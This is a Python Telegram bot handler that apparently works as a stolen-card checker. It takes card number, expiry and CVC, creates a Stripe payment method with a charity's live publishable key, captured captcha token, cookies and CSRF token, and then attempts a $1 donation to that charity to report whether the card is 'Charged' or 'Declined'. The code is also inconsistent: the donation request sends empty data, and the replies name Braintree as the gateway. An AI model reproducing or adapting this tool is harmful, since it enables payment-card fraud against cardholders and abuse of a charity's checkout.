import csv
import time
import requests

BIN_CSV_FILE = "bins_all.csv"

def get_bin_details(bin_number):
    """
    Fetch BIN details from the local CSV file instead of an API.
    """
    try:
        with open(BIN_CSV_FILE, "r", encoding="utf-8") as file:
            reader = csv.DictReader(file)
            for row in reader:
                if row["number"] == bin_number:
                    return {
                        "country": row["country"],
                        "flag": row["flag"],
                        "vendor": row["vendor"],
                        "type": row["type"],
                        "level": row["level"],
                        "bank": row["bank"]
                    }
        return None  # BIN not found
    except Exception as e:
        print(f"Error reading BIN data: {e}")
        return None

def handle_b3(bot, message):
    try:
        wait_message = bot.reply_to(message, "<b>Wait Checking...</b>", parse_mode="HTML")

        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.reply_to(message, "❌ *Usage:* `/b3 cardnumber|mm|yy|cvc`", parse_mode="Markdown")
            return

        card_details = command_parts[1].split("|")
        if len(card_details) != 4:
            bot.reply_to(message, "❌ *Invalid format!* Use `/b3 cardnumber|mm|yy|cvc`", parse_mode="Markdown")
            return

        card_number, card_month, card_year, card_cvc = card_details
        ccs = f"{card_number}|{card_month}|{card_year}|{card_cvc}"
        bin_number = card_number[:6]

        bin_details = get_bin_details(bin_number)
        if bin_details:
            country_name = bin_details["country"]
            country_flag = bin_details["flag"]
            card_vendor = bin_details["vendor"]
            card_type = bin_details["type"]
            card_level = bin_details["level"]
            bank_name = bin_details["bank"]
        else:
            country_name = "Unknown"
            country_flag = "🌍"
            card_vendor = "Unknown"
            card_type = "Unknown"
            card_level = "Unknown"
            bank_name = "Unknown"

        # Start processing time
        

        # Prepare the data for Stripe API
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'type': 'card',
            'billing_details[address][postal_code]': '10081',
            'billing_details[address][city]': 'New+york',
            'billing_details[address][country]': 'US',
            'billing_details[address][line1]': 'Street+1',
            'billing_details[email]': 'demonshop888@gmail.com',
            'billing_details[name]': 'Demon+Demonz',
            'card[number]': card_number,
            'card[cvc]': card_cvc,
            'card[exp_month]': card_month,
            'card[exp_year]': card_year,
            'guid': 'ef4de9d6-5652-4a6c-8b7e-c9f7fd469cae793405',
            'muid': 'b19741d6-64c4-4dd0-b03f-b52534cb24963daa1c',
            'sid': 'c5c9a64d-6ac5-4048-8b2c-17aa9ff705e04fc6cb',
            'payment_user_agent': 'stripe.js/08de58320f; stripe-js-v3/08de58320f; card-element',
            'referrer': 'https://www.charitywater.org',
            'time_on_page': '61805',
            'key': 'pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU',
            'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5Ijoianl2VUtvQklwejhVMFNjaEw5ay94L3lMaDZFWUtaZG1mN3loRmd1SHozQmgrWktyK2t4WTcva3FVc2dZNFBrTEplc0V0QTJ2VDA0Y01Kd2xtOXZrbnh1QzU1NDdObFR2N2NRaWJBSXRiVWxGdWExTkpZMDVmQTU3Si8zZk9DNVc3ODZzVnZWc0ZmL2lqQ0VabHBCeW8rMUZEKzAvM1NSQmd1N0pBbndsUlk1UEtsL3lwbFJNUXpONkpBejhqaHFNdnhySXBJdmpiaGVRVDZYbm9UUHJTTlU4VVZlZVE4amhiMjN3akVJdTJESzJlRGVPZVdwZTREYjdqNEE4ZVZld2E1L29QbkpCQmFSR0tzZHhmMTlqZ29nVXdFR3oxMml6VmN4YjdHVjVYL2tKS0NwS3g3WnNZQk1wWTByMjFNaVdwLzNHUjB0Z0tuZVRTWk5JK0Z2K3RrdWlzTk5acjkvaThvY1lmKzlmODBKTmI3Z2xsakluTEt6S3BUckxIYlJvMlVPK0lpQUpkVlAvRVBJNGdPRlJXMC9mbVZ5YU51Y0VzMC9RaHQ5OCtYMUpScG9zaUtxc1VCcW1QcHVUZEdGRFQ0Qnl3dXZzTWg0VS9CSi9IL05rbEc4TFVtbXJXQS81OXVzb0tXQ1dHUlptUjNlVE1tTFZxbDVqekkvczRnSmZwVXlOYzVZMHF6QUdwdHNYV1hVMXdkaUlsL253TFJUQTg5S2ZnajRLZzBIbFVMSVZyeTM2b2hYdUtkdjk5WXU3b1U4NHhkdW95cXpTbjNuNlY2T0xYUDRXcUFlbWxaRFhtbzVkQ0FWNzNhMWRWeHdqM2JpVmFnRE1yYXhIMEt2L3RoNHR1T01RTWFkSENUanF4cXhJM2d4R0FwYVVlc1M2bFFuTVdCN0piMG11R0YxajdZTzhwR2tKa3Bka1BId01mZUl6RFVyYitqdEQ1TU5sSHE4VmI2L28zQ24rcTIzTEx6dlNIL016ZzBxME5UenQrejR3b1lra1lYb1NLTVY1b001aVFRSGFzazg2SFhyWkxtUnZJb214aVg4ZVdpUUQ3QUNkOUh3WWpvdEtQUEcyM0dya3BQbXVDQUdJTEE4cm13M1ByK2xxOXV5OU1tY2JBSHA2RFFSN0D4V2F4N0pDb2xIY2NHb2ZVd3RyMW9Pa3JnRzhLbDVVVzcyOWRLQjl0amhFR3dCMGl2QlNmVkRZZlRxeDBZb0V6RTNmMnJ2d2Q1NEpkTkFEazVnSzRZZy94bTlBQytEWTEzd2RyZVdLM0Q0N1gwV1pSS3lid3k0YXNuejB3WU45UnUvTkE1TWMzemcyRUlMekNmbndHRGVEdytKSjNoeExuSWFHMkdmazloY2lrWWZwajFweStBczRaemdRL0FVaEZpS3hodHRaWXJZQ2IxY0xXckgwMWkvTjdnbWFDOWEyWFpMTUJmdlYvaTJDMTJIVUIyZ3NuVUk3WENqWmJIeWFUSkU6cTdNRnFGNmsvdndVSzBNQU5WcmJHZ1p1LzNvZytCT3UraWxyQjlWWTc1TUZybk9QUlhGR2ovQzBib2FSVzVrWkg2OWp0NlY2Zy9ZNjAvNVJFSXI0d2w2VTN6bVFHQnZSblpKajIzR3UxZUNCUER3bXIxcWtWNUxRckJzSHFIZVcya1E2cWduSlp2NVozK0FNeXh5UnhtYVdIVDVFMFNmNUhqWmdCa1M5QTRyeEFnQkJuS0pmRy9SSjNrRkxGV0hWTG11cEY3a3FBTTZ2ZW1waGJtSi96L1prU0F0eVB5VEFCTk9nWm13RnhwczhnL3pQeTJwR2RySTI2RmZIUVZoS1ZzVXR5dWkwRldVUytnS3dIdHRGTmVNN0lGSnNKTWpvUm8rRXBuWTNFcy9qWlBaa05zc05sQmxzeVgzV2hIeVdaTitoWThKZEdEQkprbntMempERS9ycE5Tczhqdm1kUkg5QVVYTW5mMWxSaWsvNTRwcVFjR0JDcnhYYWhIb09xOFZnMUNuMXdINzhtM3B5VzhUeY9oVTBRVTBJejhxS2tlYmE3RzNwc0tHL04vZ28wSy83aE5UT202ekJXNGdtSUtlM3UzejUrSUNCV1dHS1JYUGkzU21QUXlSWitURm1rNGJwOGdLU0xveFFLb3lZTmxqR29HTHpvNzFmZFBBR0dYUTNLYnRxSFpDeW96RWFHd2l6K1BMdkl2dnJpS0E4Q1dvWW1tZmp3d0xqVER5djRVMEhCMUtsemEyNXhWN1pvQ2xoZlh4U1YzSUJENXQ1WjlBTkdMOVVRMGVabWMzUyttcGRoZnBxM3ZKeXpreDFxTWxheFl4NzFvRWQwdWRzNGRNQkNuK2dCcjMxWmtkcm9velNkSWhnb2xQbVNlajYxajlQbmo1V2xaSWNwUGM2R215UnFicmFIL2lYMlFyQkMya0NFQ3JZR09SY01MQXhVeGNsdGY5aFpObXV4Mzk2M2t3bURkTjM5YUhaaWFPSkw2eDlXSTh2VkxvNTZUYitGZVphcit6U2JEc0RzbzFBcFplZWlMSE5XNWxWL21kcGQrWVRMYk1qYi9PbFBmdDhyNmJ4dklzc1AxMWc2ekxadTZKMXNzMjVTTWN1b3JtdStFb0pQc1BnUVZTM1gxZVVJSXFmVmtCaVNvTzRRc2YxWEZObGNRNEZBRHYzcjFhNWg1TlM1TE54b2pqalFhdUt4QkJ2TFlFZ252TWdPUUc1ZHp4TWdQTnhqSW9HMCtLMW5mZGc0NFd1eHJSTWJ6eXVpTFNQUUpUNHRNZm43SHNjZkJxUnJJNnJIMzQ0OFVqRWRFR1B6cERrSk5oaWl0YStqMU9DQ1FwODJpaW8zcEZlM003S2NiOWdyRlE3cWdvQVV0c3Q1emc9PSIsImV4cCI6MTcyMzM4Mzc4OCwic2hhcmRfaWQiOjI1OTE4OTM1OSwia3IiOiI0NDY0YzVhOSIsInBkIjowLCJjZGF0YSI6Im51a3pPRWtaZHhscGcrcDRmelhSN3AwQ2k2ajJMeFJuN0VON2pNaWZZYURjSWJ2UkhpcmQzU3AzYmEzdDVmK2F0OWJnTUNTTS8wK1p3dDRxVEc0NWl2UTJmSXFxOU5Zc2pRdHhySkpoNjlscG1IZkdWWDJsekNFNVVLakdrUU5nQVc2Z2VXcXROaHRQZ1gvZlhuTnJteHRyanRPSDF1QUE0SlBvelpYWWJJcDVqT2tibFd1WGd2SWpZNTI3ejhrZklRZWJEanFSMldick1jK0QifQ.BRseUN0twRCmUNUMcpOUUa90rv3ycR5I-JmuecxwYAc'
        }

        # Make the request to Stripe API
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        payment_method_id = response.json().get("id")

        if not payment_method_id:
            bot.reply_to(message, "❌ *Failed to create payment method!* Check the card details.", parse_mode="Markdown")
            return

        # Prepare data for the donation request
        cookies = {
            'countrypreference': 'US',
            'optimizelyEndUserId': 'oeu1723383536630r0.7443764185118207',
            'builderSessionId': '363b334943e04243bf999d4c756ab1d5',
            '_gcl_au': '1.1.597466485.1723383542',
            '_ga': 'GA1.1.1397204926.1723383545',
            '_fbp': 'fb.1.1723383545389.19379908383918043',
            'FPAU': '1.1.597466485.1723383542',
            '__stripe_mid': 'b19741d6-64c4-4dd0-b03f-b52534cb24963daa1c',
            '__stripe_sid': 'c5c9a64d-6ac5-4048-8b2c-17aa9ff705e04fc6cb',
            'IR_gbd': 'charitywater.org',
            'analytics_ids': 'ZgyZUuLlG7s0KlPLpv0wkxe62BtusohCs3ljAcJSQ1RJemYN%2F3f39ORXVSGeUGs2ppc4Dmi49uGoKXO6sv6Ts7lsAq9%2FOI06EEO%2FSKEdV9Syets6PWtvkeFIQJfYlixnAebNEhgBjfzbsbFDBCptlRVsD%2Bl8Zck5fxeJp4HWTvo1--DouYzC%2FagUod%2Fay7--s851HDsAGCfXwl%2FHNcKoVQ%3D%3D',
            'IR_16318': '1723384158224%7C0%7C1723384158224%7C%7C',
            '_ga_5H0VND0XMD': 'GS1.1.1723383566.1.1.1723384169.0.0.245630770',
            '_uetsid': '136b3d7057e711ef8ff4d373e5ff00a6',
            '_uetvid': '136c78f057e711efbfa0cdf893e5942c',
            '_ga_SKG6MDYX1T': 'GS1.1.1723383543.1.1.1723384226.0.0.2011021005',
        }

        headers = {
            'authority': 'www.charitywater.org',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.charitywater.org',
            'pragma': 'no-cache',
            'referer': 'https://www.charitywater.org/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-csrf-token': 'ImR58e8xb2S1JPddbv7WX2rRFmcHh9D1wIh5-HcuYqOEAYDYHBKYY8wyXODP2gkZ19FHepye0Wk9-1QvIQy0gw',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'country': 'us',
            'payment_intent[email]': 'demonshop888@gmail.com',
            'payment_intent[amount]': '1',
            'payment_intent[currency]': 'usd',
            'payment_intent[payment_method]': payment_method_id,
            'disable_existing_subscription_check': 'false',
            'donation_form[amount]': '1',
            'donation_form[comment]': '',
            'donation_form[display_name]': '',
            'donation_form[email]': 'demonshop888@gmail.com',
            'donation_form[name]': 'Demonz',
            'donation_form[payment_gateway_token]': '',
            'donation_form[payment_monthly_subscription]': 'false',
            'donation_form[surname]': 'Host',
            'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
            'donation_form[setup_intent_id]': '',
            'donation_form[subscription_period]': '',
            'donation_form[metadata][address][address_line_1]': 'Street 1',
            'donation_form[metadata][address][address_line_2]': '',
            'donation_form[metadata][address][city]': 'New york',
            'donation_form[metadata][address][country]': '',
            'donation_form[metadata][address][zip]': '10081',
            'donation_form[metadata][automatically_subscribe_to_mailing_lists]': 'true',
            'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/',
            'donation_form[metadata][phone_number]': '',
            'donation_form[metadata][plaid_account_id]': '',
            'donation_form[metadata][plaid_public_token]': '',
            'donation_form[metadata][url_params][touch_type]': '1',
            'donation_form[metadata][session_url_params][touch_type]': '1',
            'donation_form[metadata][with_saved_payment]': 'false',
        }

        # Make the donation request
        start_time = time.time()
        response = requests.post('https://www.charitywater.org/donate/stripe', data={})
        end_time = time.time()
        processing_time = round(end_time - start_time, 2)

        # Wait 0.1 sec before deleting the "Wait Checking..." message
        time.sleep(0.1)
        bot.delete_message(chat_id=message.chat.id, message_id=wait_message.message_id)

        # Handle the response
        if response.status_code != 200:
            bot.reply_to(message, f"""
<b>Declined ❌</b>

𝗖𝗮𝗿𝗱- <code>{ccs}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲- Braintree Auth 2
𝐑𝐞𝐬𝗽𝗼𝗻𝘀𝗲- ⤿ Declined ⤾

𝗜𝗻𝗳𝗼- {card_vendor} - {card_type} - {card_level}
𝐁𝐚𝐧𝐤- {bank_name}
𝐂𝐨𝐮𝗻𝘁𝗿𝘆- {country_name} {country_flag}
𝗧𝗶𝗺𝗲- {processing_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
""", parse_mode="HTML")
        else:
            bot.reply_to(message, f"""
<b>Charged 1$ ✅</b>

𝗖𝗮𝗿𝗱- <code>{ccs}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲- Braintree Auth 2
𝐑𝐞𝐬𝗽𝗼𝗻𝘀𝗲- ⤿ Approved ⤾

𝗜𝗻𝗳𝗼- {card_vendor} - {card_type} - {card_level}
𝐁𝐚𝐧𝐤- {bank_name}
𝐂𝐨𝐮𝗻𝘁𝗿𝘆- {country_name} {country_flag}
𝗧𝗶𝗺𝗲- {processing_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
""", parse_mode="HTML")

    except Exception as e:
        bot.reply_to(message, f"❌ *An error occurred:*\n\n```{str(e)}```", parse_mode="Markdown")